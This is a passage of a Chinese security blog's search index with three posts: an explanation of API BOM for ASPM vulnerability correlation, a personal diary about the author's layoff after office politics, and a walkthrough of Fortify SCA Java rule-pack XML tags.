<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>API BOM - ASPM数据关联分析纽带 </title>
    <link href="/2025/01/12/2025-01-12-api-bom/"/>
    <url>/2025/01/12/2025-01-12-api-bom/</url>
    
    <content type="html"><![CDATA[<h1 id="API-BOM-ASPM数据关联分析纽带"><a href="#API-BOM-ASPM数据关联分析纽带" class="headerlink" title="API BOM - ASPM数据关联分析纽带"></a>API BOM - ASPM数据关联分析纽带</h1><h2 id="API-BOM"><a href="#API-BOM" class="headerlink" title="API BOM"></a>API BOM</h2><p>API物料清单(API BOM)，这个概念是之前调研ASPM厂商OX Security提出的一个概念，目前没有统一的定义，可以参考软件物料清单(SBOM)。笔者在做ASPM数据分析调研的时候，主要的目的是需要寻求一种合理的方式对多个安全平台收集的数据进行去重分析，早期可以通过制定统一的漏洞分类分级标准，使用CWE编号或者支持统一的漏洞编号，比如：CVE，CNNVD，CNVD等，进行统一划分或者去重分析，但是实际实践效果就会差很多，主要原因有很多，最主要的原因是xAST产品种类繁杂，检出的结果标准不一，中间关联关系较弱，检出的风险无法进行有效的关联分析和漏洞优先级排序(VPT)。这次调研发现OX Security提出API BOM的理念和落地实践，为漏洞数据关联分析和漏洞优先级排序方面增加了新的可能。</p><h2 id="API-BOM-获取方式"><a href="#API-BOM-获取方式" class="headerlink" title="API BOM 获取方式"></a>API BOM 获取方式</h2><p>获取应用程序公开的所有 API 端点的详细列表，将检测到的安全风险映射到公开的 API（受支持的语言编写的 API）。API BOM，为用户提供应用程序代码中定义的 API 端点（内部和外部）的详细清单，相关的平台可以识别以下来源的API信息：</p><ul><li>由用户的代码直接声明定义的。</li><li>由存储库中的 OpenAPI 规范文件定义的。</li><li>通过API管理平台(比如：ApiPost，Postman)等获取。</li><li>通过前置的WAF、RASP、API网关获取。</li><li>使用EBPF或者流量镜像设备获取。</li><li>使用IAST等Agent插桩的方式获取。</li><li>可以通过日志或者其他可以获取API信息的平台获取。</li><li>利用被动代理平台或者工具来收集(burpsuite、API Parrot等)</li></ul><p>其中前两点是目前OX Security已经实现的，后面几点是笔者的观点，如果有欠缺可以一起讨论。</p><p><img src="/img/20250112-01.png" alt="ox security api bom"></p><h2 id="API-BOM重要性"><a href="#API-BOM重要性" class="headerlink" title="API BOM重要性"></a>API BOM重要性</h2><p>API BOM让用户能够更好地了解用户的应用对外暴露情况，进而更轻松地：</p><ul><li>确保用户的所有 API 都经过适当的安全审查程序。这对于管理新添加的 API 的审核特别有帮助。</li><li>管理 API 中危险的请求方式，即使它们是合法且有意包含在代码中的。比如：一个包含 <code>DELETE</code> 方法可能会改变用户的应用程序配置或用户数据。安全人员要意识到代码中存在此方法，这可能存在潜在的风险。</li><li>方便安全运营人员优先考虑 <code>API</code> 暴露的风险（攻击者可以利用暴露的API，优先进行利用）。</li></ul><h2 id="API-BOM-数据分析实践"><a href="#API-BOM-数据分析实践" class="headerlink" title="API BOM 数据分析实践"></a>API BOM 数据分析实践</h2><p>将源代码、开源组件、漏洞、情报等信息关联映射到API上，通常从以下两个维度将API和源代码进行关联<br>• API 是通过源代码检测发现的。<br>• API 是用支持此功能的语言或者框架编写的。<br>当 API 处理程序函数和包含问题的函数之间存在函数调用路径时，就可以认为该 API 的暴露进一步增加检出风险的威胁等级。</p><p>此处说的可能有些模糊，我举个例子来说明：</p><p>1、通过分析源代码，发现对外暴露的接口，此处目前有部分Jetbrians插件(Apipost-Helper、Cool Request)可以支持，目前这两个插件都是闭源产品，忍不住分析了一下，重新逆向实现后发现都是利用Jetbrians psiClass来解析api接口，效果如下：</p><p><img src="/img/20250112-02.png" alt="Api Post效果"></p><p>也可以使用JavaParser来实现，实现效果如下：<br><img src="/img/20250112-03.png" alt="api parser"></p><p>以上两种API解析，对于参数声明复杂参数，暂时解析不准，可以和API管理平台或者声明文件进行关联和补全。</p><p>2、将所有的数据存储到数据库或者数据湖当中，然后进行关联分析，利用API进行汇总分析，可以关联xAST分析结果，如果SCA支持漏洞可达性分析，可以将组件漏洞通过代码和API进行关联。当安全事件发生时，可以通过API迅速定位漏洞位置，及时止损。</p><p>3、利用漏洞优先级排序(VPT)模型或者平台，对所有检出结果进行排序，根据排序结果分配工单依次进行修复。其中，对外暴露的API在VPT计算模型的权重较高，修复优先级也越高。</p><p>注意：以上笔者目前只预研完成了第一步，后续关联分析都只是设想，如果哪位同学成功运营实现，请不吝赐教。</p><p>OX API BOM信息汇总效果如下：<br><img src="/img/20250112-05.png" alt="OX API BOM信息汇总效果"></p><p>目前OX Security 攻击路径实现效果如下：<br><img src="/img/20250112-04.png" alt="ox security 关联分析效果"><br>可以直观分析受影响的应用、请求API、源代码提交信息、源代码路径、漏洞信息、情报等信息，提高安全运营人员的效率。此处使用的是理想的测试数据，但是在日常的安全运营工作当中，可以尽可能的关联有效信息，减少海量告警信息，优化工单分配，这就极大的提升运营效率。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、API BOM可以将代码和xAST工具的检测结果进行关联，拉通API和 Source Code之间关联，进而拉通所有数据之间的关系。<br>2、丰富ASPM管理的维度。<br>3、丰富VPT计算因素，如：暴露的API，URL请求路径可达等<br>4、可以进行漏洞去重，并不局限于必须有漏洞编号、必须有统一的漏洞评价标准，可以通过API及关联的漏洞类型进行去重<br>5、降低运营人员排查难度，通过API关联数据，一个统一的平台可以检测所有受影响的系统、代码、组件，利用AI或者人工研判灵活处置分析漏洞，根据实际情况进行漏洞修复。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://docs.ox.security/a-tour-of-ox/api-bom">https://docs.ox.security/a-tour-of-ox/api-bom</a></li><li><a href="https://www.apipost.cn/">https://www.apipost.cn/</a></li><li><a href="https://coolrequest.dev/">https://coolrequest.dev/</a></li><li><a href="https://apiparrot.com/">https://apiparrot.com/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SDL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>今年的冬天真冷</title>
    <link href="/2024/11/27/2024-12-27-unemployment/"/>
    <url>/2024/11/27/2024-12-27-unemployment/</url>
    
    <content type="html"><![CDATA[<h1 id="今年的冬天真冷"><a href="#今年的冬天真冷" class="headerlink" title="今年的冬天真冷"></a>今年的冬天真冷</h1><hr><p>真心不清楚这篇博文该以什么样的形式开头，写了删，删了写，也无法抒发内心种种不甘，直到今天拿到离职证明，一切尘埃落定，四年时光如白驹过隙，一晃而过，百感交集。</p><p>21年从nsfocus离职的时候，当时也是受了委屈，看着前辈们意气风发，指点江山，激昂澎湃，自己却被蛀虫掣肘，由于直系领导都离职了，蛀虫看人下菜碟，欺负年轻人没背景，好好的项目拱手让人，当时还被蛀虫倒打一耙，说我这边项目报价有问题，项目规划有问题，我TMD，后来我才知道，当时蛀虫是收了好处费的，活生生把POC第一变成了陪标的。后面碰巧遇到现在的老板成立新公司招人，当时和老板在苏帮袁喝了一顿酒，聊得也挺开心的，也没聊薪资待遇，只想着大家一起做些事，等安排好原团队的其他成员后，加入到现在的公司。</p><p>加入新公司后，新公司当时没有核心产品，当时也是基于最早DevSecOps的思路，靠关系接一些客户定制开发订单，帮客户提升自己的开发安全能力，预研团队就两个人，我带着另一个同事去做创新，做交付，先后孵化SCA,VPT,ASOC（ASPM），可达性，TMA，服务可观测等产品和方案。主要的工作内容基本上就是先做DEMO开发或者方案制定，如果效果还可以，将DEMO工程化，后续由研发团队来对接。公司整体以研发的同事居多，安全方向的预研只能由我们这边来完成。这个合作模式的好处就是能降低预研团队和研发团队的投入，预研这边只管输出方案、DEMO，不用关注UI、系统管理等功能设计，研发团队不用刻意关注安全技术原理，只管对接就行，产品统一规划。这套模式可以有效运作，前提是团队间的配合默契，人员分工合理，没有JSG在作妖。这套模式一直有效运作，直到今年年中，不太清楚老板是如何考虑的，收购并引入了一个新的研发合伙人LT，加入后没有实质性的效果，反而开始打压老员工、搞派系斗争、积极向上管理，抢功。这个确实让人猝不及防，小公司这么搞，是要伤筋动骨的，但是现实就是，老板给予新来的研发合伙人绝对信任，认为我们老员工就是在针对新来的研发副总裁（个人看法），老员工不服从管理，老员工能力差，你也不看看LT做的事。老同事订婚时间都确定了，提前和LT请假被拒绝，这TMD是正常人能干出的事，诸如此类的事有很多，LT人品差，但是任何LT认为是挑战他的权威都要被挤兑。刚开始LT以方便管理，要全盘接手SCA，让预研这边交出SCA所有的预研工作，我当时不满意但是无可奈何，只能和老板商量，借此把和LT不对付的W保下来，划分到我的团队。此时SCA刚进行产品立项，大家加班加点开发出一个个人觉得较满意的版本，客户侧交付已经初见效果，本来这块市场很小，做出一个基础产品，技术含量也没那么高深，此时待预研的功能有很多，个人感觉一切都向着好的方向发展，团队可以继续扩张，此时LT以一个蹩脚的理由来交接，明显是来摘果子的。由于老板在中间调解，没办法只能交接了。LT觉得SCA很容易，很自信，后续看着git上交接的几十个相关项目，开始让我们要写详细的交接文档，技术实现逻辑，技术坑点，我也是服了。</p><p>一个月后，LT并不能顺利接手，只能边边角角开发一些无关功能，积极向上汇报，张口闭口就是战役、卷、加班，动不动开会复盘甩锅，为了让自己带过来的人尽快熟悉项目，开始重构项目，有问题就甩锅我们这边，虽说已经交接了，TMD，有新进展就是自己功劳，有问题就是之前的锅，明摆的就是说我们不行，你行你倒是上啊，自己嫡系接手后，搞不定，招新人背锅，我第一次发现还可以这么玩，和这种人合作，真心恶心。虽说交接快一个月了，正常来说当初吹下的牛逼该兑现了，然后新的骚操作来了，LT根本搞不定后续的开发，连个直接依赖和间接依赖都区分不清楚的人，他怎么去开发，不太清楚他和老板怎么沟通的，把团队内之前和他不和的W和另一个做数据运营的小伙伴强行划分到LT的团队了，做数据运营的小伙伴被划分过去，我还能自我安慰，是为了项目，但是把W划分过去就是单纯的打击报复了。公司是老板，这里私下也做了一些工作，都是无用功，老板只是通知了一下，就把两个小伙伴划分过去了。划过去一个多月，两个小伙伴先后离职。</p><p>内耗，不断内耗，有时候猜测老板可能只是为了降本增效，借LT来挤兑老员工。所有的都是猜测，直到今天我被辞退，我也不清楚原因，老板只说了未来不需要预研团队了，预研的技术方向在未来两年没有资源支持落地推广。然而公司在下半年不断招聘，人员也扩张不少，老员工不断离职，新人短暂停留后也提桶跑路了，其中一个最搞笑，把W挤兑走，之前运维的活都是研发的W和我兼职，现在低价找个新运维，入职第一周就删库跑路了，以前的段子就发生在身边，我也是无语了。我离职其中的原因有一部分来自LT，主要是我反感LT，人品拉胯，我不太愿意逢迎他，另外为了不和他产生冲突，预研的方向和他现在主要开发的业务要区分开，否则后续麻烦，先后做了一个EBPF方向的服务可观测（攻击可视化+自动阻断），API BOM（支撑ASPM的），SAST（利用Neo4j的能力，进行代码漏洞分析）。本以为我苟着，我没必要和LT内耗，我自己做调研，自己做新的方向，和三年前一样，一起从头再来，本月月中还在规划API被动扫描的事情，方案DEMO还在开发过程中，老板来了个消息，要谈一下团队的规划，总之就是要降本增效，开猿节流。收到这个消息，我也不知道该怎么做了，是该继续敲代码还是该做什么，浑浑噩噩到中午，和老板聊完后，无非两个方案，一个就是划到LT部门，另外就是拿着补偿走人。没别的选择，只能收拾东西走人。我并不讨厌老板，如果我在他的位置上，我感觉我承受不了他的压力，但是我单纯只是为他可惜，毕竟疫情三年，公司成长不容易，好不容易走向正轨，LT可能会毁掉它。后来我想了一下，总体原因还是自己太弱了，如果自己可以做出一个吊炸天的产品，全栈一条龙，就不会出现现在的窘迫了。</p><p>这一切都不是自己该关心的了，从月中到现在，早晚接送媳妇上下班，每天窝在家里，啥都不想做，之前还想着看看书，重拾一下之前的爱好，现在只想颓废，好久没有享受过这么长的假期了，就当给自己放个假了。颓废，很大程度上就是迷茫，之前每日按时上下班，每日压力山大，上班骑车途中，还得考虑技术方向如何实现，当日工作如何安排，现在突然什么都不用做了，有些不适应。第一次被辞退，这TMD都得适应，也是够贱的。</p><p>今天上午拿到离职证明，宣告着一切都结束了，后续我可能和公司不会再产生其他交集了，只能祝贺老板恭喜发财，公司业绩蒸蒸日上，就这样吧。</p><p>晚上去接媳妇回家，北风呼啸，今年的冬天异常寒冷。上个月还有个朋友和我说，他领导总在挤兑他，目前已经降薪，正在找下家，但是当前就业现状低迷，短时间找不到合适的工作，我当时还拉了个行业招聘交流群，方便抱团取暖，这也没过多长时间，就轮到我了，人生无常。</p><p>想起冬至那天从公司搬运个人物品，发现这四年，为了方便技术研究和学习，自己带了两台电脑、一台自己攒的服务器到公司，至于公司配的笔记本性能太弱，太耽误事。离职的时候真心难受，没事别付费上班，为了给公司省钱，自己组装机器，后来才发现，自己纯属智障，瞎操心，公司不做大语言模型相关内容，可以做其他业余，资源不够，等着老板买设备就行，LLM方向落地后，公司正常商业宣传，你这边也没有啥实质性的奖励，自己还是年轻，以后还是长点儿心吧。</p><p><img src="/img/20241227-01.png" alt="自己攒的机器"></p>]]></content>
    
    
    <categories>
      
      <category>Diary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fortify sca rules 标签介绍</title>
    <link href="/2024/11/08/2024-11-08-fortify-sca-rules-introduce/"/>
    <url>/2024/11/08/2024-11-08-fortify-sca-rules-introduce/</url>
    
    <content type="html"><![CDATA[<h1 id="fortify-sca-rules-标签介绍"><a href="#fortify-sca-rules-标签介绍" class="headerlink" title="fortify sca rules 标签介绍"></a>fortify sca rules 标签介绍</h1><hr><h1 id="RulePack标签分析"><a href="#RulePack标签分析" class="headerlink" title="RulePack标签分析"></a>RulePack标签分析</h1><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">RulePack</span> <span class="hljs-attr">xmlns:mask</span>=<span class="hljs-string">&quot;xmlns://www.fortifysoftware.com/schema/mask&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;xmlns://www.fortifysoftware.com/schema/rules&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">RulePackID</span>&gt;</span>D044EBBB-7081-4451-BDD6-5A163AD639C3<span class="hljs-tag">&lt;/<span class="hljs-name">RulePackID</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">SKU</span>&gt;</span>RUL13040<span class="hljs-tag">&lt;/<span class="hljs-name">SKU</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Name</span>&gt;</span></span><br><span class="language-xml">        &lt;![CDATA[Fortify 安全编码规则、核心、Java]]&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Name</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Activated</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Activated</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Version</span>&gt;</span>2024.2.1.0003<span class="hljs-tag">&lt;/<span class="hljs-name">Version</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Language</span>&gt;</span>java<span class="hljs-tag">&lt;/<span class="hljs-name">Language</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Description</span>&gt;</span></span><br><span class="language-xml">        &lt;![CDATA[为 Java 提供安全相关核心语言 API 范围。此规则包的部分内容来自 Cigital Java Rulepack (c) 2008 Cigital。 Copyright 2004 - 2024 Open Text.]]&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Description</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Locale</span>&gt;</span>zh_CN<span class="hljs-tag">&lt;/<span class="hljs-name">Locale</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Rules</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.2&quot;</span> <span class="hljs-attr">minimumSCA</span>=<span class="hljs-string">&quot;17.10&quot;</span>&gt;</span></span><br><span class="language-xml">    ......</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Rules</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Masks</span> <span class="hljs-attr">revision</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span></span><br><span class="language-xml">    ......</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Masks</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Localization</span>&gt;</span></span><br><span class="language-xml">    ......</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Localization</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">RulePack</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>xml标签属性说明</p><ul><li>RulePackID：规则包的唯一标识符</li><li>SKU：全局唯一标识符</li><li>Name：规则包的名称</li><li>Activated：可以使用的(猜测，没找到定义内容)</li><li>Version：规则版本</li><li>Language：规则包适配编程语言</li><li>Description：规则包描述信息</li><li>Locale：规则包语言</li><li>Rules：规则主体，其中version是版本代号，minimumSCA 标识规则最低支持的fortify sca版本</li><li>Masks ：掩码</li><li>Localization：本地化</li></ul><h1 id="Rules标签分析"><a href="#Rules标签分析" class="headerlink" title="Rules标签分析"></a>Rules标签分析</h1><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;<span class="hljs-title class_">Rules</span> version=<span class="hljs-string">&quot;3.2&quot;</span> minimumSCA=<span class="hljs-string">&quot;17.10&quot;</span>&gt;<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Notes</span>&gt;</span></span><br><span class="language-xml">        ......</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Notes</span>&gt;</span></span><br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">RuleDefinitions</span>&gt;</span></span><br><span class="language-xml">        ......</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">RuleDefinitions</span>&gt;</span></span><br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">LabelDefinitions</span>&gt;</span></span><br><span class="language-xml">        ......</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">LabelDefinitions</span>&gt;</span></span><br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Descriptions</span>&gt;</span></span><br><span class="language-xml">        ......</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Descriptions</span>&gt;</span></span><br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ControlflowStateStrings</span>&gt;</span></span><br><span class="language-xml">        ......</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">ControlflowStateStrings</span>&gt;</span></span><br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">TaintFlagDeclarations</span>&gt;</span></span><br><span class="language-xml">        ......</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">TaintFlagDeclarations</span>&gt;</span></span><br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">TaintFlagDescriptions</span>&gt;</span></span><br><span class="language-xml">        ......</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">TaintFlagDescriptions</span>&gt;</span></span><br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Coverage</span>&gt;</span></span><br><span class="language-xml">        ......</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Coverage</span>&gt;</span></span><br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ScriptDefinitions</span>/&gt;</span></span><br>&lt;/<span class="hljs-title class_">Rules</span>&gt;<br></code></pre></td></tr></table></figure><p>xml标签属性说明</p><ul><li>Notes：规则备注信息，许可声明信息</li><li>RuleDefinitions：规则集合</li><li>LabelDefinitions：标签定义</li><li>Descriptions：描述信息</li><li>ControlflowStateStrings：控制流状态字符串</li><li>TaintFlagDeclarations：污染标志声明</li><li>TaintFlagDescriptions：污染标志说明</li><li>Coverage：覆盖度</li><li>ScriptDefinitions：脚本定义</li></ul><h2 id="DataflowSourceRule-标签分析"><a href="#DataflowSourceRule-标签分析" class="headerlink" title="DataflowSourceRule 标签分析"></a>DataflowSourceRule 标签分析</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;<span class="hljs-title class_">DataflowSourceRule</span> formatVersion=<span class="hljs-string">&quot;3.2&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">MetaInfo</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Group</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;package&quot;</span>&gt;</span>Java Core Accessibility<span class="hljs-tag">&lt;/<span class="hljs-name">Group</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Group</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;inputsource&quot;</span>&gt;</span>Web<span class="hljs-tag">&lt;/<span class="hljs-name">Group</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">MetaInfo</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">RuleID</span>&gt;</span>58B43BC7-05D2-4289-B0CE-BECAFC28A45E<span class="hljs-tag">&lt;/<span class="hljs-name">RuleID</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FunctionIdentifier</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">NamespaceName</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Value</span>&gt;</span>javax.accessibility<span class="hljs-tag">&lt;/<span class="hljs-name">Value</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">NamespaceName</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">ClassName</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Value</span>&gt;</span>AccessibleText<span class="hljs-tag">&lt;/<span class="hljs-name">Value</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ClassName</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">FunctionName</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Pattern</span>&gt;</span>(get.+Index)|getSelectedText<span class="hljs-tag">&lt;/<span class="hljs-name">Pattern</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">FunctionName</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Parameters</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ParamType</span>&gt;</span>int<span class="hljs-tag">&lt;/<span class="hljs-name">ParamType</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ParamType</span>&gt;</span>int<span class="hljs-tag">&lt;/<span class="hljs-name">ParamType</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Parameters</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">ApplyTo</span> <span class="hljs-attr">implements</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">overrides</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;true&quot;</span> /&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">FunctionIdentifier</span>&gt;</span></span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">OutArguments</span>&gt;</span>return<span class="hljs-tag">&lt;/<span class="hljs-name">OutArguments</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">DataflowSourceRule</span>&gt;<br></code></pre></td></tr></table></figure><p>DataflowSourceRule识别受污染的数据进入程序的位置。</p><ul><li>MetaInfo：元信息，规则分类信息<ul><li>Group：组标签<ul><li>package：包信息，<code>&lt;Group name=&quot;package&quot;&gt;Java Core Accessibility&lt;/Group&gt;</code> 表示这条规则属于 “Java Core Accessibility” 包。</li><li>inputsource：输入源，<code>&lt;Group name=&quot;inputsource&quot;&gt;Web&lt;/Group&gt;</code> 表示这条规则关注的是来自 Web 的输入源。</li></ul></li></ul></li><li>RuleID：唯一的标识符，用于区分不同的规则。</li><li>FunctionIdentifier：函数标识<ul><li>NamespaceName：<strong>命名空间，</strong><code>&lt;NamespaceName&gt;&lt;Value&gt;javax.accessibility&lt;/Value&gt;&lt;/NamespaceName&gt;</code> 指定了方法所在的命名空间。</li><li>ClassName：<strong>类名，</strong><code>&lt;ClassName&gt;&lt;Value&gt;AccessibleText&lt;/Value&gt;&lt;/ClassName&gt;</code> 指定了方法所在的类。</li><li>FunctionName：函数名，<code>&lt;FunctionName&gt;&lt;Pattern&gt;(get.+Index)|getSelectedText&lt;/Pattern&gt;&lt;/FunctionName&gt;</code> 使用正则表达式匹配方法名，包括 <code>getCharIndex</code>, <code>getWordIndex</code>, <code>getSentenceIndex</code>, 和 <code>getSelectedText</code>。</li><li>Parameters：参数，<code>&lt;Parameters&gt;&lt;ParamType&gt;int&lt;/ParamType&gt;&lt;ParamType&gt;int&lt;/ParamType&gt;&lt;/Parameters&gt;</code> 指定了方法的参数类型，这里有两个 <code>int</code> 类型的参数。</li></ul></li><li>OutArguments：输出参数，用于指定方法调用后哪些参数或返回值应被视为污染（tainted）数据，<code>&lt;OutArguments&gt;return&lt;/OutArguments&gt;</code> 指定了方法的返回值应被视为污染数据。</li></ul><h2 id="LabelDefinitions标签分析"><a href="#LabelDefinitions标签分析" class="headerlink" title="LabelDefinitions标签分析"></a>LabelDefinitions标签分析</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs jsx">&lt;<span class="hljs-title class_">CharacterizationRule</span> formatVersion=<span class="hljs-string">&quot;3.7&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span>&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">MetaInfo</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Group</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;package&quot;</span>&gt;</span>Java Core JMX<span class="hljs-tag">&lt;/<span class="hljs-name">Group</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">MetaInfo</span>&gt;</span></span><br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">RuleID</span>&gt;</span>04DC0B4B-6AC5-4B93-9B46-486D7B4778A8<span 